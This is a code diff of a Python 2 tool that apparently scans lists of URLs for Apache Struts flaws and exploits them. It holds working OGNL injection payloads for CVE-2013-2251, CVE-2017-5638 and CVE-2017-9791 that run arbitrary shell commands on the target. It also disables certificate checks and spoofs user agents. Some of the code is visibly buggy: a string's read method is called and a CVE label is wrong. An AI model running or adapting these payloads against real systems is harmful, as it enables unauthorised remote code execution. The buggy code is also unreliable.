@@ -1,5 +1,6 @@
 #!/usr/bin/python
 # -*- coding: utf-8 -*-
+import urllib
 import urllib2
 import httplib
 import multiprocessing
@@ -9,31 +10,20 @@ import requests
 import re  # normies get out
 import sys
 import random
+import ssl
 
 
-def post(target, data):
+def post(url, data, headers):
     try:
-        response = urllib2.urlopen(target, data, timeout=25)
-    except Exception as e:
-        logging.error("[-] ERROR at %s; %s" % (target, e))
+        ctx = ssl.create_default_context()
+        ctx.check_hostname = False
+        ctx.verify_mode = ssl.CERT_NONE
+        response = urllib2.urlopen(url, data, headers=headers, context=ctx, timeout=5)
+    except Exception as err:
+        logging.error("[-] ERROR at %s; %s" % (url, err))
     result = re.compile('[\\x00-\\x08\\x0b-\\x0c\\x0e-\\x1f]').sub('', response.read())
 
     return result
-
-
-def quote(data):
-    return data.replace("#", "%23").replace("=", "%3d").replace(" ", "%20").replace("(", "%28").replace(")", "%29").replace("'", "%27")
-
-
-def success(data):
-    print "[+] %s" % str(data)
-
-
-def create_command(input):
-    return_val = ""
-    for g in input.split(' '):
-        return_val += '\'%s\',' % g
-    return return_val.rstrip(",")
 
 
 def getAgent():
@@ -118,7 +108,22 @@ def getAgent():
     return agent
 
 
-def cve_2013_vuln(location, command):
+def quote(data):
+    return data.replace("#", "%23").replace("=", "%3d").replace(" ", "%20").replace("(", "%28").replace(")", "%29").replace("'", "%27")
+
+
+def success(data):
+    print "[+] %s" % str(data)
+
+
+def create_command(input):
+    return_val = ""
+    for g in input.split(' '):
+        return_val += '\'%s\',' % g
+    return return_val.rstrip(",")
+
+
+def cve_2013_2251(url, command):
 
     s2_16_path = '?redirect:${#a=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletRequest\'),#b=#a.getRealPath("/"),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#b),#matt.getWriter().flush(),#matt.getWriter().close()}'
     s2_16_payloads = (
@@ -127,22 +132,27 @@ def cve_2013_vuln(location, command):
         '?action:${#a=(new java.lang.ProcessBuilder(new java.lang.String[]{PAYLOAD})).start(),#b=#a.getInputStream(),#c=new java.io.InputStreamReader(#b),#d=new java.io.BufferedReader(#c),#e=new char[50000],#d.read(#e),#matt=#context.get(\'com.opensymphony.xwork2.dispatcher.HttpServletResponse\'),#matt.getWriter().println(#e),#matt.getWriter().flush(),#matt.getWriter().close()}',
     )
 
-    raw_path = requests.get(location + quote(s2_16_path), verify=False).content.replace("\r", "").replace("\n", "")
+    raw_path = requests.get(url + quote(s2_16_path), verify=False).content.replace("\r", "").replace("\n", "")
     command = command.replace("%RAW_PATH%", raw_path)
     command = create_command(command)
 
     for payload in s2_16_payloads:
+        agent = getAgent()
+        headers = {'User-Agent': agent}
+        result = post(url, quote(payload).replace("PAYLOAD", quote(command)), headers)
 
-        assert post()
-        result = post(location, quote(payload).replace("PAYLOAD", quote(command)))
-        # if not "<html" in result.lower():
-        success(str("Found path in %s" % raw_path))
-        if "65a3e764068d229ee9d62906aee6cab72f96bacc" in result:
-            logging.info("[!] %s is VULN to CVE-2013-2251" % location.strip('\n'))
-        # return result
+        if "65a3e764068d229ee9d62906aee6cab72f96bacc" in result.read():
+            sys.stdout.write("\033[1;31m")
+            logging.info("[!] %s is VULN to CVE-2017-5638" % url.strip('\n'))
+            sys.stdout.write("\033[0;0m")
+            return True
+        else:
+            logging.debug("[-] %s is NOT vulnerable." % url.strip('\n'))
+            return False
 
 
-def cve_2017_vuln(url, cmd):
+
+def cve_2017_5638(url, cmd):
 
     payload = "%{(#_='multipart/form-data')."
     payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
@@ -164,9 +174,11 @@ def cve_2017_vuln(url, cmd):
 
     try:
 
-        headers = {'User-Agent': 'Mozilla/5.0', 'Content-Type': payload}
-        request = urllib2.Request(url, headers=headers)
-        page = urllib2.urlopen(request).read()
+        headers = {'User-Agent': getAgent(), 'Content-Type': payload}
+        #request = urllib2.Request(url, headers=headers)
+        #page = urllib2.urlopen(request).read()
+        data = {}
+        page = post(url, data, headers)
 
     except httplib.IncompleteRead, e:
         page = e.partial
@@ -188,6 +200,43 @@ def cve_2017_vuln(url, cmd):
     else:
         logging.debug("[-] %s is NOT vulnerable." % url.strip('\n'))
         return False
+
+
+def cve_2017_9791(url, cmd):
+
+    # INCOMPLETE
+    # YOU NEED TO HAVE A VALID FORM SUBMIT, SO TIS WILL REQUIRE BS4 TO SCRAPE ALL FORM FIELDS FOR A FORM SUBMIT
+    # This could be a time consuming scan.
+    payload = ""
+    payload += "%{(#_='multipart/form-data')."
+    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
+    payload += "(#_memberAccess?(#_memberAccess=#dm):"
+    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
+    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
+    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
+    payload += "(#ognlUtil.getExcludedClasses().clear())."
+    payload += "(#context.setMemberAccess(#dm))))."
+    payload += "(#cmd='%s')." % cmd
+    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
+    payload += "(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start())."
+    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
+    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
+
+    headers = {'User-Agent': getAgent()}
+
+    data = {
+        'ExampleForm': payload,
+        'NotVulnParam': "hi",
+        'NotVulnParam2': 2
+    }
+
+    data = urllib.urlencode(data)
+
+    try:
+        post(url, data, headers)
+
+    except Exception as error:
+        logging.error(error)
 
 
 if __name__ == '__main__':
@@ -259,30 +308,16 @@ $$/   $$/  $$$$$$/  $$$$$$$/   $$$$$$/  $$$$$$$$/  $$$$$$/   $$$$$$/     $$$$/  
             logging.info("[*] Checking if %s is vulnerable" % x.strip('\n'))
             q = multiprocessing.Queue()
             q = multiprocessing.Pool(processes=7)
-            p = q.Process(target=cve_2017_vuln, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
+            p = q.Process(target=cve_2017_5638, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
             p.start()
-            #p2 = q.Process(target=cve_2013_vuln, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
-            #p2.start()
-
+            p2 = q.Process(target=cve_2013_2251, args=(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
+            p2.start()
+            #p3 = q.Process(target=cve_2017_9791, args(x, "echo 65a3e764068d229ee9d62906aee6cab72f96bacc"))
+            #p3.start()
         except Exception as e:
 
             logging.error(e)
 
     else:
-
-        for x in url_obj:
-
-            x.strip()
-
-            try:
-                #logging.info("[*] Running %s on %s" % (args.cmd, x))
-                #p = multiprocessing.Process(target=cve_2017_vuln, args=(x, args.cmd))
-                #p.start()
-                #p2 = multiprocessing.Process(target=cve_2013_vuln, args=(x, args.cmd))
-                #p2.start()
-                print "NOTHING ATM"
-
-            except Exception as e:
-
-                logging.error("[-] Shit broke on %s with error: %s" % (x, e))
-                p.terminate()
+        logging.error("[-] Shit broke on %s with error: %s" % (x, e))
+        p.terminate()
